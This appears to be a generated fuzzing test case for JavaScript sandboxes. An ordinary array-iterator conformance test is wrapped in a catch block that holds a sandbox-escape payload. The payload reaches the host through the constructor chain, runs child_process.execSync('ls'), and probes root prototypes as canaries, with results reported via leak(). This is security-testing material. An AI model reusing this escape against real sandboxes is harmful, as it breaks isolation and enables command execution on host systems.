try {
    var array = [];
    var iterator = array.keys();
    var result;
    array.push('a');
    result = iterator.next();
    assert.sameValue(result.done, false, 'First result `done` flag');
    assert.sameValue(result.value, 0, 'First result `value`');
    result = iterator.next();
    assert.sameValue(result.done, true, 'Exhausted result `done` flag');
    assert.sameValue(result.value, undefined, 'Exhausted result `value`');
    array.push('b');
    result = iterator.next();
    assert.sameValue(result.done, true, 'Exhausted result `done` flag (after push)');
    assert.sameValue(result.value, undefined, 'Exhausted result `value` (after push)');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}